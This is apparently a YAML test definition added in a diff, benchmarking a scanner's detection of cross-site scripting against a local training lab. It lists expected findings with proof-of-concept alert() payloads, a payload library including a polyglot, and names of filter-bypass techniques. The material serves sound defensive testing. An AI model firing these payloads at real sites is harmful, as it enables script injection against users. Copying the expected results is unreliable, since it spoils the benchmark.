@@ -1,0 +1,210 @@
+# Test Case: vuln_02_xss
+# Category: Vulnerability Scanning - Cross-Site Scripting (XSS)
+# Description: XSS vulnerability detection test covering all three types
+
+id: vuln_02_xss
+name: Cross-Site Scripting (XSS) Detection Test
+description: |
+  Comprehensive XSS vulnerability testing including:
+  - Reflected XSS
+  - Stored/Persistent XSS  
+  - DOM-based XSS
+  - Blind XSS
+  
+  Tests detection across various contexts: HTML, JavaScript,
+  URL, CSS, and HTML attributes.
+
+category: vulnerability_scan
+target_type: web
+difficulty: medium
+version: "1.0"
+tags:
+  - xss
+  - cross-site-scripting
+  - reflected-xss
+  - stored-xss
+  - dom-xss
+  - injection
+owasp_categories:
+  - "A03:2021-Injection"
+
+cwe_ids:
+  - "CWE-79"
+  - "CWE-80"
+
+# Target Configuration
+target_url: "http://localhost:3000"
+target_host: localhost
+target_port: 3000
+
+# Test Contexts and Endpoints
+test_contexts:
+  html_context:
+    - path: "/search"
+      parameter: "q"
+      vulnerable: true
+      
+  javascript_context:
+    - path: "/track"
+      parameter: "callback"
+      vulnerable: true
+      
+  attribute_context:
+    - path: "/profile"
+      parameter: "img"
+      vulnerable: true
+      
+  url_context:
+    - path: "/redirect"
+      parameter: "url"
+      vulnerable: true
+
+# Expected Findings
+expected_findings:
+  - vuln_type: reflected_xss
+    severity: high
+    location: "/search - q parameter (HTML context)"
+    cwe_id: "CWE-79"
+    confidence: 0.95
+    description: |
+      Reflected XSS in search parameter. Input reflected without
+      proper sanitization in HTML context.
+      Payload: <script>alert('XSS')</script>
+    verification_method: "manual"
+    exploit_available: true
+    
+  - vuln_type: stored_xss
+    severity: critical
+    location: "/comments - comment field"
+    cwe_id: "CWE-79"
+    confidence: 0.90
+    description: |
+      Stored XSS in comment system. Malicious script stored
+      and executed for all users viewing comments.
+      Payload: <img src=x onerror=alert('Stored XSS')>
+    verification_method: "manual"
+    exploit_available: true
+    
+  - vuln_type: dom_xss
+    severity: high
+    location: "/#callback= (JavaScript context)"
+    cwe_id: "CWE-79"
+    confidence: 0.85
+    description: |
+      DOM-based XSS via hash fragment. Unsafe usage of
+      location.hash in JavaScript code.
+      Payload: #callback=alert('DOM XSS')//
+    verification_method: "manual"
+    exploit_available: true
+    
+  - vuln_type: reflected_xss
+    severity: medium
+    location: "/profile - img parameter (Attribute context)"
+    cwe_id: "CWE-79"
+    confidence: 0.88
+    description: |
+      XSS via HTML attribute injection. Input reflected
+      in img src attribute without validation.
+      Payload: " onerror=alert('attr XSS') 
+    verification_method: "manual"
+    exploit_available: true
+    
+  - vuln_type: open_redirect
+    severity: medium
+    location: "/redirect - url parameter"
+    cwe_id: "CWE-601"
+    confidence: 0.90
+    description: "Open redirect can be combined with XSS for phishing"
+    verification_method: "manual"
+
+# Test Parameters
+parameters:
+  xss_types:
+    - reflected
+    - stored
+    - dom
+  test_contexts:
+    - html
+    - javascript
+    - attribute
+    - url
+    - css
+  polyglots: true
+  encoding_tests: true
+  waf_evasion: false
+  
+# Success Criteria
+min_detection_rate: 0.80
+max_false_positive_rate: 0.20
+max_duration_seconds: 240
+
+# Expected Duration
+expected_duration_seconds: 90
+
+# Resource Requirements
+resource_requirements:
+  memory_mb: 512
+  cpu_cores: 1
+  network_access: true
+  browser_automation: true  # For DOM XSS testing
+
+# Docker Configuration
+docker_compose: |
+  version: '3'
+  services:
+    xss-lab:
+      image: xsstraining/xss-lab:latest
+      ports:
+        - "3000:80"
+      environment:
+        - LAB_LEVEL=all
+      networks:
+        - xss-net
+
+  networks:
+    xss-net:
+      driver: bridge
+
+# Validation
+health_check_endpoint: "http://localhost:3000"
+success_indicators:
+  - "At least 3 XSS vulnerabilities detected"
+  - "Both reflected and stored XSS identified"
+  - "Context-aware payloads generated"
+
+# XSS Payload Library for Verification
+payload_library:
+  basic:
+    - "<script>alert('XSS')</script>"
+    - "<img src=x onerror=alert('XSS')>"
+    - "<svg onload=alert('XSS')>"
+    
+  polyglots:
+    - "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>")
+    
+  attribute_context:
+    - '" onfocus=alert(1) autofocus "'
+    - "' onerror=alert(1) '
+    - "><img src=x onerror=alert('XSS')>"
+    
+  javascript_context:
+    - "';alert('XSS');//"
+    - "'-alert(1)-'"
+    - "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e"
+    
+  dom_based:
+    - "#<img src=x onerror=alert(1)>"
+    - "javascript:alert(1)"
+    - "data:text/html,<script>alert(1)</script>"
+
+# Bypass Techniques to Test
+bypass_techniques:
+  encoding:
+    - html_entities
+    - url_encoding
+    - unicode_normalization
+  
+  obfuscation:
+    - case_variation
+    - whitespace_insertion
+    - null_byte_insertion
